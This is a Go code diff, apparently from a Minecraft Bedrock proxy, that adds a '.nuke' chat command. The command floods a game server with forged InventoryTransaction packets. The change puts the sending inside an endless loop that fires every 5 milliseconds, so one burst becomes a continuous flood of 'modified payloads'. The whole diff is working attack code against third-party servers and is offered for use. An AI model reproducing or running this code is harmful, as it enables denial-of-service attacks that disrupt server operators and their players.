@@ -89,43 +89,45 @@ func handleConn(conn *minecraft.Conn, listener *minecraft.Listener, config confi
 			if pk, ok := pk.(*packet.Text); ok {
 				if pk.Message == ".nuke" {
 					go func() {
-						actions := make([]protocol.InventoryAction, COUNT)
-						for i := range actions {
-							newAction := actions[i]
-							newAction.InventorySlot = 28
-							newAction.SourceType = protocol.InventoryActionSourceContainer
-							newAction.WindowID = protocol.WindowIDInventory
-							newAction.NewItem = protocol.ItemInstance{
-								StackNetworkID: 0,
-								Stack: protocol.ItemStack{
-									ItemType: protocol.ItemType{
-										NetworkID: 0,
+						for {
+							actions := make([]protocol.InventoryAction, COUNT)
+							for i := range actions {
+								newAction := actions[i]
+								newAction.InventorySlot = 28
+								newAction.SourceType = protocol.InventoryActionSourceContainer
+								newAction.WindowID = protocol.WindowIDInventory
+								newAction.NewItem = protocol.ItemInstance{
+									StackNetworkID: 0,
+									Stack: protocol.ItemStack{
+										ItemType: protocol.ItemType{
+											NetworkID: 0,
+										},
+										BlockRuntimeID: 0,
+										Count:          32,
+										HasNetworkID:   true,
 									},
-									BlockRuntimeID: 0,
-									Count:          32,
-									HasNetworkID:   true,
-								},
-							}
-							newAction.OldItem = protocol.ItemInstance{
-								StackNetworkID: 2,
-								Stack: protocol.ItemStack{
-									ItemType: protocol.ItemType{
-										NetworkID: 2,
+								}
+								newAction.OldItem = protocol.ItemInstance{
+									StackNetworkID: 2,
+									Stack: protocol.ItemStack{
+										ItemType: protocol.ItemType{
+											NetworkID: 2,
+										},
+										BlockRuntimeID: 2,
+										Count:          2,
+										HasNetworkID:   true,
 									},
-									BlockRuntimeID: 2,
-									Count:          2,
-									HasNetworkID:   true,
-								},
-							}
+								}
 
-							actions[i] = newAction
+								actions[i] = newAction
+							}
+							serverConn.WritePacket(&packet.InventoryTransaction{
+								Actions:         actions,
+								TransactionData: &protocol.NormalTransactionData{},
+							})
+							logrus.Infof("Sending %d modified payloads to the server!", COUNT)
+							time.Sleep(5 * time.Millisecond)
 						}
-						serverConn.WritePacket(&packet.InventoryTransaction{
-							Actions:         actions,
-							TransactionData: &protocol.NormalTransactionData{},
-						})
-						logrus.Infof("Sending %d modified payloads to the server!", COUNT)
-						time.Sleep(5 * time.Millisecond)
 					}()
 				}
 			}
